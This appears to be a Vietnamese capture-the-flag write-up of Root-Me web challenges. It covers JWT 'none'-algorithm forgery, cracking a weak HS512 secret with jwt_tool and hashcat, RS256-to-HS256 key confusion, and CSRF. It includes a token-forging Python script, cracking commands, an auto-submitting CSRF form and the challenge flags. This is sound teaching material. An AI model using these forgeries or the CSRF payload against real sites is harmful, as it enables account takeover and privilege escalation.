# Trần Mạnh Huy - JWT - json web token
<hr>

* [Chall 1: JSON Web Token (JWT) - Introduction](#chall-1-json-web-token-jwt---introduction)
* [Chall 2: JSON Web Token (JWT) - Weak secret](#chall-2-json-web-token-jwt---weak-secret)
* [Chall 3: JSON Web Token (JWT) - Public key](#chall-3-json-web-token-jwt---public-key) 
* [Chall 4: CSRF - 0 protection](#chall-4-csrf---0-protection)
* [Chall 5: CSRF - token bypass](#chall-5-csrf---token-bypass)

<hr>

## Chall 1: JSON Web Token (JWT) - Introduction
```
To validate the challenge, connect as admin.
```
Ta có login form như sau 

![image](https://user-images.githubusercontent.com/104350480/219703907-2e0197cf-93da-4230-a230-164f0473c52c.png)

Để ý có nhấn vào guest thử rồi check burp:

![image](https://user-images.githubusercontent.com/104350480/219705924-bb74b020-b6d7-48b5-a735-c662ef36634e.png)

Sửa thử username = admin thì server trả về lỗi: 

![image](https://user-images.githubusercontent.com/104350480/219708136-04c02ff0-8a0f-4ce9-891f-fee65f60067a.png)



Thế thì ta chỉnh alg = none vì để none thì server sẽ kh xác thực signature nữa, ta xóa phần signature cũng được và lỗi cũng biến mất, ta được kết quả.

![image](https://user-images.githubusercontent.com/104350480/219706460-833ef24c-d343-48b9-9eff-aa7d2a16d3ae.png)

> flag: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7

```
import base64
import json

header = {'typ':'JWT', 'alg':'none'}
payload = {'username':'admin'}
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode('utf-8').rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode('utf-8').rstrip('=')
data = header_encoded +'.'+payload_encoded+'.'
print(data)
```

## Chall 2: JSON Web Token (JWT) - Weak secret

```
"Let's play a small game, I bet you cannot access to my super secret admin section. Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."

```

![image](https://user-images.githubusercontent.com/104350480/219711939-05cb4769-bdef-4024-aea3-2e92e5ffb132.png)

Mở đường dẫn /token ta có token:

> Here is your token	"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"

![image](https://user-images.githubusercontent.com/104350480/219831488-82906321-0618-429f-a177-6ed253af0c4f.png)


Chuyển sang phương thức POST /admin, ta có: 

![image](https://user-images.githubusercontent.com/104350480/219831018-a2a1142c-255f-42ca-a9b4-9a897db12daf.png)

Thêm Authorization vào xem được gì nào: 

![image](https://user-images.githubusercontent.com/104350480/219831273-213e8862-495d-4558-b382-0bd9f36e0e7a.png)

Bài này dùng alg: HS512, thì như tên bài thì có vẻ secret key khá yếu, dùng tool để bruteforce xem sao: Ở đây ta dùng jwt_tool với list đơn giản
từ rockyou.txt

> payload: python3 jwt_tool.py --token --C -d /usr/share/wordlists/rockyou.txt 

![image](https://user-images.githubusercontent.com/104350480/219830868-0655a46b-6375-4fa5-bab8-da0cac9e3afd.png)

Oke vậy là ta có được secretkey là lol, giờ ném lên jwt.io chỉnh lại payload thành admin và thêm secretkey lol là xong: 

![image](https://user-images.githubusercontent.com/104350480/219832730-a58fad6e-e2cb-48c3-a422-c3b4d957b817.png)

> Flag: PleaseUseAStrongSecretNextTime
 
Hoặc có thể dùng cách khác để bruteforce khá đơn giản là dùng hashcat

>payload: hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt --force

> https://hashcat.net/wiki/doku.php?id=example_hashes

![image](https://user-images.githubusercontent.com/104350480/219835386-3adb6412-afff-454e-80fa-f1b89997c6ba.png)

Ta cũng có được secretkey tương ứng là lol

![image](https://user-images.githubusercontent.com/104350480/219836351-03ba3270-2447-4a15-a901-d7d27cab47c5.png)

## Chall 3: JSON Web Token (JWT) - Public key

```
You find an API with 3 endpoints:

/key (accessible with GET)
/auth (accessible with POST)
/admin (accessible with POST)
There is sure to be important data in the admin section, access it!

```
Mở vào trang thì cũng kh có gì, nhưng như bài đã cung cấp cho ta 3 endpoint rồi:

![image](https://user-images.githubusercontent.com/104350480/220160437-189b3652-27a0-4163-a95c-0e31fccfad79.png)

Ném lên burpsuite và truy cập vào **GET /web-serveur/ch60/key** ta được 1 public key trả về đúng như tên bài: 

```
"-----BEGIN PUBLIC KEY-----", "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4iMUdm9olWjWrZLP5g9R", "TqFux6r1Wx0ovriPNnW5QdTYFb/FyCDOoUV4S0GGe+Ef/mi9gIQBlABIoGL34+6w", "SZyHQv+8ESxRBlniqhJQ8fMJzVV0kWDN4MtnWmFeTOhuHQ8/rBFAtJEk5tl0PZia", "KcWFghtPufxhzUqLgggO7bztvngRWztgExgcwo77NyeYQ2+EUQMgHgAKcydVokbU", "64VnfDtONsfc6o1F+EIKVhlEkp5g46oKAbiTHFlwbrasdsKVMeN9qv9+sBNbmJI/", "Au6YMj9TifkVd/OSOlW9DkCL/HIGSoaBiCC5eK+8Am4/QAo+NYEoYJ9D9TNs2f2O", "fQIDAQAB", "-----END PUBLIC KEY-----"

```

![image](https://user-images.githubusercontent.com/104350480/220160747-369e6985-bd0f-4570-bea3-1c8760b1c3b9.png)

Thử sang đường dẫn là **POST /web-serveur/ch60/admin** ta được:

![image](https://user-images.githubusercontent.com/104350480/220161853-29c693bf-e87d-445d-b25a-ceaf0ed4611e.png)

Sửa như message trả về, ta thêm 'Authorization: YOURTOKEN' vào thì được message khác trả về:

![image](https://user-images.githubusercontent.com/104350480/220169775-4df38871-a549-4ced-8a2f-d1cfccdb76d0.png)

Cần xác thực authentication nên tiếp với đường dẫn **POST /web-serveur/ch60/auth** ta được:

![image](https://user-images.githubusercontent.com/104350480/220161687-6a092d07-8ccf-4d5b-a347-b1b35dd1fe70.png)

Thêm username=admin vào xem sao:

![image](https://user-images.githubusercontent.com/104350480/220174432-7232c6a1-b9cd-4292-ade7-9eb26a435c80.png)

Lỗi là chắc rồi, ta lại thay bằng guest để lấy token thôi: 

```
{"result": "Hello guest", "Here is your token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.ijki-3H5jA6wsSWu6tKXy7HwOQcbvxkc9c1vHWgqOF8gP7dkCUg2nE7QJ2FYeuGj2-VdRPOUVdQzKfOvrsaTVI3uDmUNygrvVm8Yhuw6o9nlqtm5_MNe53dQ5Pmo7uBg-JyfMhEUvHWdW2uXLW-rxSDRCq8xcdG3RC8smzUMLs_-VmboAaW9rV-IMw5JERSZmlPnEGAQ0oMowEC8C3G1LcE5_0vZ9EtNq8yWkzr9I2CWfLwkZIWh1rj0XOI3I_iFrFsr2-LP0xK-NdaArQ86o59XjMU1KgqNCSAGQ0JmDQtvMymYWt6PkDjlzQ2x3YILJpA5gpAS8ZTOJdVnF_rZ3w"}

```
Sau khi có được token lên jwt.io để phân tích thử, ta thu được alg được dùng là RS256 và public key được dùng để verify và private key dùng để ký:

![image](https://user-images.githubusercontent.com/104350480/220175012-285f05bc-63ee-4a46-8674-813d81c6ccf5.png)

Đến đây vì là kiến thức cũng mới nên mình phải dừng đọc tài liệu chút:

> Reference: https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf?_gl=1*c017c9*_ga*NzM2OTE5OTkuMTY2OTA4MzExMA..*_ga_SRYSKX09J7*MTY3NjkwOTE4Ni4xMDQuMS4xNjc2OTA5NjE1LjAuMC4w

Ở bài này đọc related source mà rootme cung cấp thì bài này có liên quan đến việc thay đổi thuật toán mã hóa, thì cụ thể ở đây thì với các thuật toán như
HS256 hay HS512 thì dùng secret key để ký và verify() các message trả về, còn thuật toán RS256 được dùng trong bài này là dùng private key để ký message 
còn dùng public key để veryfy() các message này. Thì như trong source cung cấp thì ta có thể hiểu thế này, nếu mà ta thay đổi được thuật toán từ RS256
sang HS256 được thì signature bây giờ được verify hay xác minh bằng cách sử dụng thuật toán HS256 với chữ kí bây giờ là public key thay cho secret key, mà
public key là cái mà ta đã biết rồi nên nếu đổi được thuật toán thì coi như ta sẽ có được secret key và lúc này coi như sẽ giải quyết được chall.

Để khai thác tiếp thì ta sửa đổi đoạn jwt trên chút:

![image](https://user-images.githubusercontent.com/104350480/220175677-72f0ea6c-668b-4e6e-be6c-47725894f22a.png)

Lấy phần header và payload để kết hợp với publickey: 

> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.RFdzbGFzMjNSVzBZaTJ6L2tVTkhOOVdNTDV1NGVjajhHS3BqdjNaMGxZTT0
> Public key chuyển về dạng ascii: 


Ta được: 

![image](https://user-images.githubusercontent.com/104350480/220177007-8a8bec09-33aa-47ec-b79e-6149afb83ce2.png)

> 8e5c1adf326f172ce185e38ab5a05dc3306cf52e9112fc97f22d5f3b3a6c8854
> cmd: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:

Dùng cyberchef ta thu được: 

![image](https://user-images.githubusercontent.com/104350480/220177366-a51c0ec7-a42b-4f20-92c4-7366850a1db2.png)


## Chall 4: CSRF - 0 protection

Mở vào chall là có:

![image](https://user-images.githubusercontent.com/104350480/219910186-addd360d-2a09-4472-9427-149f8b36bcea.png)

Vì là dạng csrf nên chưa khai thác được gì, ta register rồi đăng nhập vào trang thì được

![image](https://user-images.githubusercontent.com/104350480/219910295-afb165e6-3a6a-42d3-a3c1-2446afbfee15.png)

Mục tiêu bây giờ là phải xem được thông tin private, hay phải bật được status on của mình chỗ profile:

![image](https://user-images.githubusercontent.com/104350480/219911520-c7c9b76e-6368-4759-acd4-0e105050cada.png)

Ta có thể để ý status đang bị disabled, ta có thể sửa lại thành value="on", nhưng tất nhiên là không thu được gì, server trả về "You're not admin"

![image](https://user-images.githubusercontent.com/104350480/219912788-791a0026-95e1-4087-aca3-860e82f9efb1.png)

Bây giờ ta cần gửi 1 form tương tự để lừa admin kick vào link ta gửi. Lấy luôn source code từ trang và thêm link trang vào phần action:

```
<form id="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
<div>
<label>Username:</label>
<input id="username" type="text" name="username" value="huy123456">
</div>
<br>		
<div>
<label>Status:</label>
<input id="status" type="checkbox" name="status" value="on" >
</div>
<br>
<input id="token" type="hidden" name="token" value="dd29a211ad5ad8b6e426dde5150648dd" />
<button type="submit">Submit</button>
</form>
   
   ```
 Sửa lại form 1 chút, thêm script để tự động gửi submit: 
 
 ```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF</title>
</head>
<body>
    <form id="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="username" value="huy123456" />
    <input type="hidden" name="status" value="on" />
    </form>
<script> document.getElementById("csrf").submit()</script> 
</body>
</html>

```

Đợi 1 lúc ta được flag trả về:

> Csrf_Fr33style-L3v3l1!

## Chall 5: CSRF - token bypass

```
Activate your account to access intranet.

```


